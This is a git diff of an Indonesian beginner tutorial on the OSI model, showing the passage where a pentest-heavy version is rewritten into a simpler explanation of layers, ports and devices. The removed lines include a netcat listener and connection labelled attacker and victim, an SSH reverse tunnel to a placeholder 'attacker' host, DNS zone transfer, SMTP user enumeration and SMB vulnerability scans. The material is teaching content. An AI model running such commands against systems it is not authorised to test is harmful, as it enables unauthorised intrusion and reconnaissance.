@@ -1,1137 +1,383 @@
 # Model OSI
 
-> **LearnCybersecurity** | Seri Networking Fundamentals
+> **LearnCybersecurity** | Seri Dasar Networking
 > Terakhir diperbarui: 2026 | Penulis: kodoktheGr3at
 
 ---
 
 <!-- LC-CURRICULUM-START -->
-> **Curriculum ID:** `LC-038` | **Fase 2:** Networking
-> **Estimasi belajar:** 6-8 jam | **Level:** Beginner
+> **ID Kurikulum:** `LC-038` | **Fase 2:** Networking
+> **Estimasi belajar:** 6-8 jam | **Level:** Pemula
 > **Prasyarat:** LC-005
 > **Peta buku:** Kurose & Ross, Computer Networking Ch.1-2; Stallings, Network Security Essentials Ch.2
 <!-- LC-CURRICULUM-END -->
 
-## Daftar isi
+## Daftar Isi
 
-1. Overview: apa itu model OSI
-2. Layer 1: Physical
-3. Layer 2: Data Link
-4. Layer 3: Network
-5. Layer 4: Transport
-6. Layer 5: Session
-7. Layer 6: Presentation
-8. Layer 7: Application
-9. Enkapsulasi data
-10. Perbandingan TCP vs UDP
-11. Port-port umum
-12. Protokol per layer
-13. Perangkat jaringan per layer
-14. Catatan keamanan: serangan per layer
-15. Workflow praktis: recon & analisis jaringan
+1. Apa itu model OSI, dan kenapa penting
+2. Tujuh layer satu per satu
+3. Cara data berjalan: enkapsulasi
+4. TCP vs UDP
+5. Port yang perlu kamu tahu
+6. Perangkat mana bekerja di layer mana
+7. Serangan dan pertahanan, per layer
+8. Troubleshooting dengan layer
+9. OSI vs model TCP/IP
+10. Referensi cepat
 
 ---
 
-## 1. Overview: apa itu model OSI
+## Istilah penting
 
-Model OSI (Open Systems Interconnection Model) adalah kerangka konseptual standar yang mendefinisikan cara kerja sistem komunikasi jaringan, terbagi menjadi 7 layer. Model ini dikembangkan oleh ISO (International Organization for Standardization) pada tahun 1984.
+Istilah-istilah ini akan sering muncul di materi.
 
-Setiap layer memiliki tanggung jawab spesifik dan hanya berkomunikasi dengan layer langsung di atas dan di bawahnya. Model ini bersifat referensial: implementasi nyata biasanya memakai model TCP/IP (4 layer), tetapi OSI tetap menjadi standar untuk memahami, melakukan troubleshooting, dan menganalisis jaringan.
+| Istilah | Artinya |
+|:---|:---|
+| Protokol | Seperangkat aturan yang disepakati, diikuti dua komputer supaya bisa saling mengerti |
+| Layer (lapisan) | Satu "tugas" di networking. Setiap layer menangani tugasnya, lalu menyerahkan hasilnya ke layer berikutnya |
+| PDU | Nama potongan data di sebuah layer (bit, frame, packet, segment, data) |
+| Alamat MAC | ID hardware yang tertanam di kartu jaringan, dipakai di dalam satu jaringan lokal |
+| Alamat IP | Alamat logis untuk mengarahkan data melintasi jaringan yang berbeda |
+| Port | Angka yang menyatakan data itu untuk program yang mana di sebuah komputer (web = 80, SSH = 22) |
+| Header | Info tambahan yang ditempelkan sebuah layer di depan data (alamat, port, dsb.) |
+| Enkapsulasi | Membungkus data dengan header saat turun melewati layer |
+| Frame / packet / segment | Satuan data di layer Data Link / Network / Transport |
 
-Kenapa ini penting untuk cybersecurity:
+---
 
-- Memahami di layer mana suatu serangan terjadi membantu identifikasi vektor serangan.
-- Memahami enkapsulasi data mendukung analisis paket dan forensik jaringan.
-- Mengetahui protokol di tiap layer membantu konfigurasi firewall dan IDS/IPS.
-- Memahami perangkat jaringan mendukung pentesting dan reconnaissance jaringan.
-- Menganalisis traffic yang tidak wajar mendukung threat hunting dan incident response.
+## 1. Apa Itu Model OSI, dan Kenapa Penting
 
-### Model OSI, gambaran visual
+**Model OSI** (Open Systems Interconnection) adalah cara memecah "bagaimana komputer berkomunikasi lewat jaringan" menjadi **7 layer**, masing-masing dengan satu tugas yang jelas. Model ini diterbitkan lembaga standar ISO pada 1984.
+
+Bayangkan mengirim paket. Satu orang menulis surat, orang lain memasukkannya ke amplop dan menuliskan alamat, kurir menentukan rute, truk membawanya secara fisik. Tiap tahap hanya mengurus tugasnya sendiri dan percaya tahap lain mengerjakan bagiannya. Jaringan bekerja begitu juga: tiap layer mengerjakan bagiannya lalu menyerahkannya ke layer berikut.
+
+Model OSI adalah **peta untuk belajar dan troubleshooting**. Jaringan nyata sebenarnya berjalan di atas model TCP/IP yang lebih sederhana (Bagian 9), tapi OSI adalah kosakata bersama yang dipakai semua orang untuk menjelaskan di mana sesuatu terjadi.
+
+Kenapa penting untuk keamanan:
+
+- Mengetahui *di layer mana* sebuah serangan terjadi memberi tahu di mana harus menaruh pertahanan (firewall web tidak akan menghentikan serangan di kabel).
+- Memahami cara data dibungkus layer demi layer adalah dasar analisis paket.
+- Mengetahui protokol mana ada di tiap layer memandu aturan firewall dan IDS/IPS.
+
+### Tujuh layer sekilas
 
 ```
-┌─────────────────────────────────────────────────────────────────────────┐
-│                          OSI MODEL (7 Layers)                           │
-├───────┬──────────────────┬────────────────────────────────────────────┤
-│ Layer │   Name           │  Key Responsibilities                       │
+┌───────┬──────────────────┬────────────────────────────────────────────┐
+│ Layer │   Nama           │  Tugasnya                                   │
 ├───────┼──────────────────┼────────────────────────────────────────────┤
-│   7   │  Application     │  User-facing protocols (HTTP, FTP, DNS)    │
-│   6   │  Presentation    │  Encoding, encryption, compression         │
-│   5   │  Session         │  Connection management, authentication     │
-│   4   │  Transport       │  TCP/UDP, ports, flow control              │
-│   3   │  Network         │  IP addressing, routing                    │
-│   2   │  Data Link       │  MAC addresses, switches, frames           │
-│   1   │  Physical        │  Cables, signals, bits                     │
+│   7   │  Application     │  Protokol yang dipakai aplikasi (HTTP, DNS, SSH) │
+│   6   │  Presentation    │  Format, enkripsi, kompresi                 │
+│   5   │  Session         │  Memulai, menjaga, dan mengakhiri percakapan │
+│   4   │  Transport       │  TCP/UDP, port, pengiriman andal             │
+│   3   │  Network         │  Alamat IP, routing antar jaringan           │
+│   2   │  Data Link       │  Alamat MAC, switch, frame                   │
+│   1   │  Physical        │  Kabel, radio, bit mentah                    │
 └───────┴──────────────────┴────────────────────────────────────────────┘
 
-                    Data Unit (PDU) per Layer:
-┌─────────────────────────────────────────────────┐
-│  Layer 7 — Application   →  Data                │
-│  Layer 6 — Presentation  →  Data                │
-│  Layer 5 — Session       →  Data                │
-│  Layer 4 — Transport     →  Segment (TCP)        │
-│                             Datagram (UDP)        │
-│  Layer 3 — Network       →  Packet              │
-│  Layer 2 — Data Link     →  Frame               │
-│  Layer 1 — Physical      →  Bits (0s and 1s)    │
-└─────────────────────────────────────────────────┘
-
-Mnemonic untuk mengingat urutan layer (atas ke bawah):
-  "Anak Pintar Selalu Tahu Nama Daftar Protokol"
+Trik menghafal, atas ke bawah:
+  "All People Seem To Need Data Processing"
 ```
 
 ---
 
-## 2. Layer 1: Physical
+## 2. Tujuh Layer Satu per Satu
 
-Layer Physical adalah layer paling bawah dalam model OSI. Layer ini bertanggung jawab atas transmisi bit mentah (0 dan 1) melalui media fisik. Layer ini tidak peduli dengan makna data, ia hanya memindahkan sinyal listrik, optik, atau radio dari satu titik ke titik lain.
+### Layer 1 — Physical: memindahkan bit mentah
 
-Komponen utama:
+Layer paling bawah. Membawa 1 dan 0 polos sebagai pulsa listrik, cahaya, atau gelombang radio. Layer ini tidak mengerti arti datanya; cuma memindahkan sinyal dari A ke B. Ini soal kabel, fiber, konektor, radio, dan perangkat yang hanya mengulang sinyal (hub, repeater).
 
-- Kabel (Ethernet, fiber optic, coaxial)
-- Sinyal listrik, cahaya, atau gelombang radio
-- Konektor dan port fisik (RJ45, SFP, BNC)
-- Perangkat repeater dan hub
+Perintah aman untuk memeriksanya:
 
 ```bash
-# Physical layer related commands
-
-# Check network interface status (link up/down = physical layer)
-$ ip link show
-$ ifconfig
-$ ethtool eth0          # NIC speed, duplex, link status
-
-# Windows equivalent
-> ipconfig /all
-> Get-NetAdapter         # PowerShell
-
-# Check cable / physical connection
-$ ethtool eth0 | grep "Link detected"
-Link detected: yes
-
-# Check interface errors (physical issues)
-$ ip -s link show eth0
-$ netstat -i
-$ cat /proc/net/dev
-
-# Wireshark — capture at physical/data link level
-$ tcpdump -i eth0 -n    # capture raw frames
-$ wireshark             # GUI packet capture
+ip link show            # apakah interface-nya up? (Linux)
+ethtool eth0            # kecepatan, duplex, "Link detected: yes"
+ip -s link show eth0    # penghitung error (kabel jelek, interferensi)
 ```
 
-| Media | Kecepatan | Jarak maksimum |
-|-------|-----------|------------------|
-| Cat5e UTP | 1 Gbps | 100 meter |
-| Cat6 UTP | 10 Gbps | 55 meter |
-| Fiber single-mode | 100 Gbps+ | 40 sampai 80 km |
-| Fiber multi-mode | 10 Gbps | 550 meter |
-| Wi-Fi 6 (802.11ax) | 9.6 Gbps | ~100 meter |
+| Media | Kecepatan umum | Jarak maks |
+|-------|-------|---------------|
+| Kabel Cat5e | 1 Gbps | 100 m |
+| Kabel Cat6 | 10 Gbps | 55 m |
+| Fiber (single-mode) | 100 Gbps+ | 40–80 km |
+| Wi-Fi 6 | hingga ~9,6 Gbps | ~100 m |
+
+### Layer 2 — Data Link: bicara dengan perangkat sebelah
+
+Layer ini memindahkan data antar perangkat di **jaringan lokal yang sama**, memakai **alamat MAC** (ID hardware tiap kartu jaringan). Satuan datanya adalah **frame**. Perangkat utamanya adalah **switch**, yang belajar MAC mana ada di port mana lalu meneruskan frame sesuai itu.
+
+```bash
+ip link show      # alamat MAC-mu sendiri
+ip neigh show     # tabel ARP: IP mana memetakan ke MAC mana
+```
+
+Protokol yang perlu diketahui: **Ethernet** (frame LAN kabel), **ARP** (mencari MAC untuk sebuah IP, dibahas di LC-042), **802.1Q** (tag VLAN), **STP** (mencegah loop antar switch).
+
+### Layer 3 — Network: mencari jalur antar jaringan
+
+Layer ini membawa data dari satu jaringan ke jaringan lain memakai **alamat IP**, dan memilih rutenya. Satuan datanya adalah **packet**, dan perangkat utamanya adalah **router**.
+
+```bash
+ip addr show          # alamat IP-mu
+ip route show         # tabel routing / default gateway
+ping -c 4 8.8.8.8     # apakah host itu bisa dijangkau sama sekali? (ICMP)
+traceroute 8.8.8.8    # lewat jalur mana paketnya?
+```
+
+Protokol: **IPv4/IPv6** (pengalamatan), **ICMP** (ping dan pesan error), **OSPF/BGP** (router saling berbagi rute).
+
+### Layer 4 — Transport: menyampaikan data ke program yang tepat, dengan andal
+
+Layer ini menghubungkan **program**, bukan sekadar mesin, memakai **nomor port**. Ada dua pilihan utama:
+
+- **TCP:** membangun koneksi dulu, menjamin semua tiba berurutan, mengirim ulang yang hilang. Dipakai untuk web, SSH, email.
+- **UDP:** langsung menembakkan data tanpa persiapan dan tanpa jaminan. Lebih cepat, dipakai untuk DNS, panggilan video, game.
+
+```bash
+ss -tulnp             # port mana yang terbuka dan listening (Linux)
+nc -zv host 22        # apakah sebuah port TCP bisa dijangkau?
+```
+
+### Layer 5 — Session: mengelola percakapan
+
+Memulai, menjaga, dan mengakhiri sebuah "session" antar aplikasi dengan rapi. Kalau transfer putus, layer session adalah ide yang memungkinkannya lanjut dari titik yang tepat. Contoh: session NetBIOS dan SMB (berbagi file Windows), RPC, iSCSI.
+
+### Layer 6 — Presentation: menerjemahkan dan mengamankan data
+
+Si "penerjemah". Memastikan data dari satu sistem bisa dibaca sistem lain: encoding karakter (ASCII, Unicode), kompresi (gzip), dan **enkripsi (TLS ada di sini)**. Base64 dan format gambar seperti JPEG/PNG juga urusan layer presentation.
+
+```bash
+echo "Hello" | base64          # encode
+echo "SGVsbG8K" | base64 -d    # decode
+openssl s_client -connect example.com:443 </dev/null   # memeriksa koneksi TLS
+```
+
+### Layer 7 — Application: yang sebenarnya "dibicarakan" program
+
+Layer teratas, paling dekat dengan pengguna. Ini soal **protokol jaringan** yang dipakai aplikasi, bukan aplikasinya sendiri. HTTP, DNS, FTP, SSH, SMTP, SNMP, LDAP, RDP, SMB semuanya ada di sini.
+
+> Catatan: "Application layer" **bukan** berarti Chrome atau Firefox. Maksudnya protokol (HTTP) yang dibicarakan program-program itu.
+
+```bash
+curl -I https://example.com    # melihat header respons HTTP
+dig example.com                # lookup DNS
+```
+
+| Protokol | Port | Kegunaan |
+|----------|------|----------|
+| HTTP / HTTPS | 80 / 443 | Web |
+| DNS | 53 | Lookup nama |
+| SSH | 22 | Shell jarak jauh yang aman |
+| FTP | 21 | Transfer file (cleartext) |
+| SMTP | 25 | Mengirim email |
+| SMB | 445 | Berbagi file Windows |
+| RDP | 3389 | Remote desktop |
 
 ---
 
-## 3. Layer 2: Data Link
+## 3. Cara Data Berjalan: Enkapsulasi
 
-Layer Data Link bertanggung jawab atas transfer data yang dapat diandalkan antara dua node yang terhubung langsung dalam satu segmen jaringan yang sama. Layer ini menggunakan MAC Address (Media Access Control) untuk mengidentifikasi perangkat dan mengelola akses ke media fisik.
+Saat kamu mengirim sesuatu, data turun melewati layer di mesinmu. Tiap layer membungkus data dengan **header**-nya sendiri, seperti memasukkan surat ke dalam amplop di dalam amplop yang lebih besar. Di sisi lain, tiap layer membuka amplopnya saat naik.
 
-Layer ini dibagi menjadi dua sub-layer:
+```
+KOMPUTERMU (turun)                     KOMPUTER LAIN (naik)
 
-- LLC (Logical Link Control): kontrol aliran dan pengecekan error
-- MAC (Media Access Control): pengalamatan fisik dan akses media
+L7  Data                               L7  Data
+L6  Data                               L6  Data
+L5  Data                               L5  Data
+L4  [header TCP | Data]  = Segment     L4  [header TCP | Data]
+L3  [header IP | Segment] = Packet     L3  [header IP | ...]
+L2  [header MAC | Packet | FCS] = Frame L2 [header MAC | ... | FCS]
+L1  101000110101...  = Bit             L1  101000110101...
 
-```bash
-# Data Link layer commands
-
-# View MAC addresses
-$ ip link show
-$ arp -a                  # ARP table (IP ↔ MAC mapping)
-$ arp -n
-
-# Windows
-> arp -a
-> getmac /v
-
-# ARP spoofing detection (Wireshark filter)
-# Filter: arp.duplicate-address-detected
-# Filter: arp.src.hw_mac != eth.src
-
-# Send raw Ethernet frames (Layer 2) with Scapy (Python)
-$ python3
->>> from scapy.all import *
->>> frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.1")
->>> sendp(frame, iface="eth0")
-
-# View switch MAC address table (if you have access)
-# Cisco: show mac address-table
-# Linux bridge: bridge fdb show
-
-# 802.1Q VLAN tagging
-$ ip link add link eth0 name eth0.100 type vlan id 100
-$ ip addr add 192.168.100.1/24 dev eth0.100
-
-# Capture Layer 2 traffic
-$ tcpdump -e -i eth0      # -e shows MAC addresses
+            ─────── media fisik ───────>
 ```
 
-| Protokol | Fungsi | Relevansi pentest |
-|----------|--------|---------------------|
-| ARP | Resolusi IP ke MAC | Critical (ARP spoofing) |
-| Ethernet II | Frame standar LAN | Medium |
-| 802.1Q | VLAN tagging | High (VLAN hopping) |
-| STP (802.1D) | Mencegah loop jaringan | High (STP attack) |
-| PPP | Link point-to-point | Low |
+Tiap layer hanya membaca header *miliknya sendiri*. Satuan datanya berganti nama di tiap level: **bit** (L1), **frame** (L2), **packet** (L3), **segment** (L4), dan sekadar **data** di atasnya.
 
 ---
 
-## 4. Layer 3: Network
+## 4. TCP vs UDP
 
-Layer Network bertanggung jawab atas routing dan pengalamatan logis (IP address). Layer ini menentukan jalur terbaik untuk mengirimkan paket data dari sumber ke tujuan melewati beberapa jaringan berbeda. Perangkat utama di layer ini adalah router.
+Keduanya ada di Layer 4, tapi perilakunya sangat berbeda.
 
-Unit data di layer ini disebut packet.
+| Aspek | TCP | UDP |
+|--------|-----|-----|
+| Satuan data | Segment | Datagram |
+| Koneksi | Ya (handshake 3 langkah) | Tidak |
+| Andal? | Ya, mengirim ulang data yang hilang | Tidak ada jaminan |
+| Berurutan? | Ya | Tidak dijamin |
+| Kecepatan | Lebih lambat (overhead lebih banyak) | Lebih cepat |
+| Cocok untuk | Web, SSH, transfer file, email | DNS, panggilan video, game |
 
-```bash
-# Network layer commands
+### Handshake 3 langkah TCP
 
-# IP addressing
-$ ip addr show
-$ ip addr add 192.168.1.10/24 dev eth0
-
-# Routing table
-$ ip route show
-$ route -n
-$ netstat -rn
-
-# Windows
-> route print
-> Get-NetRoute
-
-# Ping — ICMP echo (Layer 3 reachability test)
-$ ping 8.8.8.8
-$ ping -c 4 192.168.1.1   # 4 packets only
-
-# Traceroute — show routing path
-$ traceroute 8.8.8.8       # Linux/Mac
-> tracert 8.8.8.8          # Windows
-$ mtr 8.8.8.8              # real-time traceroute
-
-# IP Subnet calculations
-$ ipcalc 192.168.1.0/24
-$ python3 -c "import ipaddress; print(list(ipaddress.IPv4Network('10.0.0.0/28').hosts()))"
-
-# Wireshark filter for IP layer
-# ip.addr == 192.168.1.1
-# ip.src == 10.0.0.0/8
-# icmp
-
-# Nmap — Layer 3/4 scanning
-$ nmap -sn 192.168.1.0/24         # Ping sweep (host discovery)
-$ nmap -sP 192.168.1.0/24         # ARP + ICMP discovery
-$ nmap -O 192.168.1.1             # OS detection (TTL analysis)
-```
-
-| Protokol | Fungsi | Relevansi pentest |
-|----------|--------|---------------------|
-| IPv4 | Pengalamatan 32-bit | High |
-| IPv6 | Pengalamatan 128-bit | High |
-| ICMP | Pesan kontrol & error | High (ICMP flood) |
-| OSPF | Protokol routing dinamis | Medium |
-| BGP | Routing antar-AS | High (BGP hijack) |
-| IPSec | Enkripsi & autentikasi IP | Low |
-
----
-
-## 5. Layer 4: Transport
-
-Layer Transport bertanggung jawab atas komunikasi end-to-end antara aplikasi pada host yang berbeda. Layer ini menggunakan port number untuk mengidentifikasi layanan/aplikasi yang berkomunikasi, serta menyediakan flow control, error recovery, dan segmentasi data.
-
-Dua protokol utama:
-
-- TCP (Transmission Control Protocol): connection-oriented, reliable, terurut
-- UDP (User Datagram Protocol): connectionless, cepat, tanpa jaminan pengiriman
-
-```bash
-# Transport layer commands
-
-# View open ports & connections
-$ ss -tulnp               # preferred (modern)
-$ netstat -tulnp           # traditional
-$ netstat -ano             # Windows
-
-# Windows PowerShell
-PS> Get-NetTCPConnection
-PS> Get-NetUDPEndpoint
-
-# TCP 3-way handshake (SYN-SYN/ACK-ACK)
-# Wireshark filter: tcp.flags.syn==1
-# Wireshark filter: tcp.stream eq 0
-
-# Port scanning with Nmap
-$ nmap -sT 192.168.1.1         # TCP connect scan (full handshake)
-$ nmap -sS 192.168.1.1         # SYN stealth scan (half-open)
-$ nmap -sU 192.168.1.1         # UDP scan
-$ nmap -p 80,443,8080 192.168.1.1   # specific ports
-$ nmap -p- 192.168.1.1         # all 65535 ports
-$ nmap -sV 192.168.1.1         # service version detection
-
-# Netcat — TCP/UDP raw connections
-$ nc -lvnp 4444               # listen (attacker)
-$ nc 192.168.1.10 4444        # connect (victim → attacker)
-$ nc -u 192.168.1.1 53        # UDP mode
-$ nc -zv 192.168.1.1 22       # port check (banner grab)
-
-# Banner grabbing
-$ nc -nv 192.168.1.1 80
-HEAD / HTTP/1.0
-
-# Check for SYN flood (DoS attack detection)
-$ netstat -an | grep SYN_RECV | wc -l
-```
-
-### Perbandingan TCP vs UDP
-
-| Fitur | TCP | UDP |
-|-------|-----|-----|
-| Koneksi | Connection-oriented (3-way handshake) | Connectionless |
-| Keandalan | Terjamin, memakai ACK | Tidak terjamin, fire and forget |
-| Urutan | Pengiriman terurut | Bisa tidak terurut |
-| Kecepatan | Lebih lambat (overhead) | Lebih cepat |
-| Penggunaan | HTTP, SSH, FTP, Email | DNS, DHCP, VoIP, video streaming |
-
-### TCP 3-way handshake
+Sebelum TCP mengirim data sungguhan, kedua pihak saling menyapa dalam tiga langkah. Seperti telepon: "Kamu dengar aku?" — "Ya, kamu dengar aku?" — "Ya."
 
 ```
 Client                          Server
-  │                               │
-  │──── SYN (seq=100) ───────────>│   Step 1: Client initiates
-  │                               │
-  │<─── SYN+ACK (seq=200,ack=101)─│   Step 2: Server acknowledges + syncs
-  │                               │
-  │──── ACK (ack=201) ───────────>│   Step 3: Client acknowledges
-  │                               │
-  │<════ DATA TRANSFER ══════════>│   Connection established!
-  │                               │
-  │──── FIN ─────────────────────>│   Step 4: Teardown (4-way)
-  │<─── ACK ──────────────────────│
-  │<─── FIN ──────────────────────│
-  │──── ACK ─────────────────────>│   Connection closed
+  │──── SYN ─────────────────────>│   1. "Aku mau bicara"
+  │<─── SYN + ACK ────────────────│   2. "Oke, aku juga mau bicara"
+  │──── ACK ─────────────────────>│   3. "Bagus, ayo mulai"
+  │<════ data mengalir dua arah ═>│
 ```
+
+Menutup koneksi adalah pertukaran sopan serupa (FIN / ACK) di kedua arah.
 
 ---
 
-## 6. Layer 5: Session
+## 5. Port yang Perlu Kamu Tahu
 
-Layer Session bertanggung jawab untuk membangun, mengelola, dan mengakhiri sesi komunikasi antara aplikasi. Layer ini memastikan bahwa jika koneksi terputus, sesi dapat dilanjutkan dari titik yang tepat (checkpointing). Layer ini juga mengatur dialog control (half-duplex vs full-duplex).
+**Port** adalah angka 0 sampai 65535 yang menyatakan traffic itu untuk layanan yang mana di sebuah mesin. Ada tiga rentang:
+
+- **0–1023:** port terkenal (HTTP 80, SSH 22). Di kebanyakan sistem, hanya administrator yang bisa membukanya.
+- **1024–49151:** port terdaftar untuk aplikasi tertentu.
+- **49152–65535:** port sementara, dipilih otomatis untuk tiap koneksi keluar.
 
 ```bash
-# Session layer examples
-
-# NetBIOS — Session Layer protocol (Windows networking)
-$ nmblookup -A 192.168.1.1    # NetBIOS name lookup
-$ nbtscan 192.168.1.0/24      # scan for NetBIOS names
-
-# RPC (Remote Procedure Call) — Session layer
-$ rpcinfo -p 192.168.1.1      # list RPC services
-$ showmount -e 192.168.1.1    # NFS shares (uses RPC)
-
-# SMB Session (Windows file sharing)
-$ smbclient -L //192.168.1.1  # list SMB shares
-$ smbclient //192.168.1.1/share -U username
-
-# Session hijacking detection (Wireshark)
-# Filter: tcp.seq or unexpected RST packets
-# Look for duplicate SEQ numbers
-
-# SQL*Net (Oracle DB sessions) — port 1521
-# iSCSI sessions — port 3260
-
-# SSH — manages sessions with keep-alive
-$ ssh -o ServerAliveInterval=60 user@host
+# Discovery sederhana dan sah atas apa yang terbuka di host milikmu
+nmap host              # port-port umum
+nmap -p- host          # semua port
+nc -zv host 443        # cek satu port tertentu
 ```
 
-| Protokol | Fungsi | Relevansi pentest |
-|----------|--------|---------------------|
-| NetBIOS | Layanan penamaan Windows | High |
-| RPC | Pemanggilan prosedur jarak jauh | High |
-| SMB | Berbagi file Windows | Critical |
-| SQL*Net | Sesi database Oracle | Medium |
-| iSCSI | Storage melalui jaringan | Medium |
+| Port | Layanan | Kenapa sensitif |
+|------|---------|--------------------|
+| 21 | FTP | Mengirim password dalam cleartext |
+| 22 | SSH | Target login yang umum; pakai key, bukan password |
+| 23 | Telnet | Cleartext; sebaiknya dipensiunkan |
+| 25 | SMTP | Email; bisa disalahgunakan untuk enumerasi user atau relay spam |
+| 53 | DNS | Bisa membocorkan nama internal (zone transfer) |
+| 80 / 443 | HTTP / HTTPS | Seluruh permukaan serangan web |
+| 139 / 445 | NetBIOS / SMB | Berbagi file Windows; secara historis sangat sering dieksploitasi |
+| 3389 | RDP | Remote desktop; target brute-force yang sering |
+| 3306 / 5432 | MySQL / PostgreSQL | Database yang terekspos dengan login lemah atau default |
+| 6379 | Redis | Sering dibiarkan tanpa autentikasi sama sekali |
 
 ---
 
-## 7. Layer 6: Presentation
+## 6. Perangkat Mana Bekerja di Layer Mana
 
-Layer Presentation adalah "penerjemah" jaringan. Layer ini bertanggung jawab atas format data, enkripsi/dekripsi, dan kompresi. Layer ini memastikan data yang dikirim oleh satu aplikasi bisa dibaca oleh aplikasi lain meskipun format internalnya berbeda.
+| Layer | Perangkat | Tugas |
+|-------|-----------|-------|
+| 7 Application | Firewall web (WAF), proxy, load balancer | Memfilter dan memeriksa HTTP/TLS |
+| 4 Transport | Firewall stateful | Mengizinkan/memblokir berdasarkan port dan koneksi |
+| 3 Network | Router, switch Layer-3 | Routing antar jaringan |
+| 2 Data Link | Switch, bridge, access point | Meneruskan frame berdasarkan MAC |
+| 1 Physical | Hub, repeater, kabel, kartu jaringan | Membawa sinyal |
 
-Tanggung jawab utama:
-
-- Encoding/decoding: ASCII, Unicode, EBCDIC
-- Enkripsi/dekripsi: SSL/TLS beroperasi di sini
-- Kompresi/dekompresi: gzip, zlib
+Cara cepat melihat router Layer-3 yang dipakai mesinmu sendiri:
 
 ```bash
-# Presentation layer — encoding, encryption, compression
-
-# Base64 encoding/decoding
-$ echo "Hello World" | base64
-SGVsbG8gV29ybGQK
-$ echo "SGVsbG8gV29ybGQK" | base64 -d
-Hello World
-
-# URL encoding
-$ python3 -c "import urllib.parse; print(urllib.parse.quote('hello world'))"
-hello%20world
-
-# SSL/TLS certificate inspection (HTTPS = TLS at Presentation layer)
-$ openssl s_client -connect google.com:443
-$ openssl s_client -connect target.com:443 </dev/null 2>/dev/null | openssl x509 -noout -text
-
-$ curl -v https://google.com 2>&1 | grep -E "SSL|TLS|cipher"
-
-# Check SSL/TLS version & ciphers (pentesting)
-$ nmap --script ssl-enum-ciphers -p 443 target.com
-$ sslscan target.com
-$ testssl.sh target.com
-
-# Identify file encoding/format
-$ file suspicious.bin
-$ xxd suspicious.bin | head -20     # hex dump
-$ strings suspicious.bin | head -20  # extract strings
-
-# Common encoding conversions (Python)
-$ python3 -c "
-data = 'Hello'
-print('Base64:', __import__('base64').b64encode(data.encode()).decode())
-print('Hex:', data.encode().hex())
-print('URL:', __import__('urllib.parse').quote(data))
-"
-```
-
-| Format / protokol | Fungsi | Relevansi pentest |
-|----------------------|--------|---------------------|
-| SSL/TLS | Enkripsi transport | High (SSLstrip, downgrade) |
-| ASCII/Unicode | Encoding teks | Medium |
-| Base64 | Encoding binary ke teks | High (payload obfuscation) |
-| gzip/zlib | Kompresi data | Low |
-| JPEG/PNG/GIF | Format gambar | Medium (steganografi) |
-| MIME | Format email multipart | Medium |
-
----
-
-## 8. Layer 7: Application
-
-Layer Application adalah layer tertinggi dalam model OSI dan satu-satunya layer yang berinteraksi langsung dengan pengguna akhir. Layer ini menyediakan antarmuka antara aplikasi dan jaringan, serta mendefinisikan protokol yang dipakai aplikasi untuk berkomunikasi.
-
-> Catatan: layer Application tidak berarti aplikasi itu sendiri (seperti Chrome atau Firefox). Layer ini merujuk pada protokol jaringan yang dipakai aplikasi-aplikasi tersebut.
-
-```bash
-# Application layer — common protocols & tools
-
-# HTTP / HTTPS
-$ curl -v http://target.com                  # verbose HTTP request
-$ curl -X POST -d "user=admin&pass=123" http://target.com/login
-$ wget http://target.com/file.txt
-
-# DNS — Domain Name System
-$ dig google.com                             # full DNS lookup
-$ dig google.com A                           # IPv4 record
-$ dig google.com MX                          # Mail exchange
-$ dig google.com NS                          # Name servers
-$ dig @8.8.8.8 google.com                   # use specific DNS server
-$ host google.com
-$ nslookup google.com
-
-# DNS zone transfer (pentesting!)
-$ dig axfr @ns1.target.com target.com
-$ fierce --domain target.com                # DNS brute force
-
-# FTP
-$ ftp 192.168.1.1
-$ ftp -n 192.168.1.1 <<EOF
-  user anonymous ""
-  ls
-  bye
-EOF
-
-# SSH
-$ ssh user@192.168.1.1
-$ ssh -p 2222 user@192.168.1.1              # non-default port
-$ ssh -L 8080:internal:80 user@bastion      # local port forward
-$ ssh -R 4444:localhost:4444 user@attacker  # reverse tunnel
-
-# SMTP — Email
-$ nc -v mail.target.com 25
-EHLO test.com
-VRFY admin@target.com                       # user enumeration!
-
-# SNMP — Network Management
-$ snmpwalk -c public -v 2c 192.168.1.1     # community string: public
-$ onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.1
-
-# Application layer scanning (Nmap scripts)
-$ nmap --script http-title -p 80,443 192.168.1.0/24
-$ nmap --script http-robots.txt target.com
-$ nmap --script smtp-enum-users target.com
-$ nmap --script dns-brute target.com
-$ nmap --script ftp-anon target.com         # anonymous FTP check
-$ nmap --script smb-vuln-* 192.168.1.1     # SMB vulnerabilities
-```
-
-| Protokol | Port | Fungsi | Relevansi pentest |
-|----------|------|--------|---------------------|
-| HTTP | 80 | Web tidak terenkripsi | High |
-| HTTPS | 443 | Web terenkripsi | High |
-| DNS | 53 | Resolusi nama domain | High |
-| FTP | 21 | Transfer file (cleartext) | Critical |
-| SSH | 22 | Shell aman | High |
-| Telnet | 23 | Shell tidak aman | Critical |
-| SMTP | 25 | Mengirim email | High |
-| POP3 | 110 | Mengambil email | Medium |
-| IMAP | 143 | Mengelola email | Medium |
-| SNMP | 161 | Manajemen jaringan | High |
-| LDAP | 389 | Directory service | High |
-| RDP | 3389 | Remote desktop | Critical |
-| SMB | 445 | Berbagi file Windows | Critical |
-| MSSQL | 1433 | SQL Server | High |
-| MySQL | 3306 | Database MySQL | High |
-| RPC | 135 | Remote procedure call | High |
-
----
-
-## 9. Enkapsulasi data
-
-Enkapsulasi adalah proses di mana setiap layer OSI menambahkan header (dan kadang trailer) ke data sebelum meneruskannya ke layer di bawahnya. Proses sebaliknya disebut de-enkapsulasi, yang terjadi di sisi penerima.
-
-```
-Sender (Encapsulation)                    Receiver (De-encapsulation)
-──────────────────────────────────────────────────────────────────────
-
-Layer 7 — Application                     Layer 7 — Application
-┌─────────────────────────┐               ┌─────────────────────────┐
-│         DATA            │               │         DATA            │
-└─────────────────────────┘               └─────────────────────────┘
-            ↓ Add L7 header                           ↑ Remove L7 header
-
-Layer 6 — Presentation                    Layer 6 — Presentation
-┌──────┬──────────────────┐               ┌──────┬──────────────────┐
-│  L6H │       DATA       │               │  L6H │       DATA       │
-└──────┴──────────────────┘               └──────┴──────────────────┘
-            ↓ Add L5 header                           ↑ Remove L5 header
-
-Layer 5 — Session                         Layer 5 — Session
-┌───┬──┬──────────────────┐               ┌───┬──┬──────────────────┐
-│L5H│L6│       DATA       │               │L5H│L6│       DATA       │
-└───┴──┴──────────────────┘               └───┴──┴──────────────────┘
-            ↓ Add TCP/UDP header                       ↑ Remove L4 header
-
